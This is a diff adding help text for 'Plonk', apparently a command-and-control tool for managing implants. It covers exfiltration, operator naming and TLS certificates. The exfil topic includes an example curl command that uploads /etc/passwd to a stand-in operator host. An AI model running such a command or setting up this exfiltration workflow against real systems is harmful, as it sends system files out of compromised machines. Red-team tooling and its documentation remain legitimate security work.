@@ -1,0 +1,45 @@
+# help.txtar
+# ,help topic text
+# By J. Stuart McMurray
+# Created 20231229
+# Last Modified 20231229
+
+This file contains the information returned by ,help [topic].  Each topic
+starts with the topic name in --'s, has a one-line description used for
+,help topics, and then contains the rest of the help text.
+
+-- exfil --
+Sending back largeish chunks of data
+
+Largeish amounts of data can be stored in <plonkdir>/exfil by sending the data
+in the body of an HTTP request to /p/<path>.
+
+It is helpful to set the first element of the path to the ID of the target from
+which the exfil is being received; besides making it easier to remeber which
+file comes from where, received exfil will be shown when that ID has been
+selected with ,seti.
+
+Example:
+
+curl -T /etc/passwd https://example.com/p/kittens/etc/passwd
+
+will store /etc/passwd in <plonkdir>/exfil.
+
+-- names --
+Operator names and logging
+
+In Plonk's logs, an operator name is associated with every queued task.  This
+name is, by default, the name of the user running Plonk as a client, but may
+be set with ,name should the need arise.  This is handy for having multiple
+Plonk bot users using the same OS account.
+
+-- TLS ---
+TLS certificate generation
+
+By default, Plonk generates a single self-signed TLS certificate used for any
+TLS connection.  The SNIs which an implant must present may be restricted with
+the -self-signed flag.
+
+Proper TLS certificates may be obtained from Let's Encrypt by pointing a domain
+name at Plonk and using -letsencrypt.  Make sure Let's Encrypt can reach Plonk
+on port 443
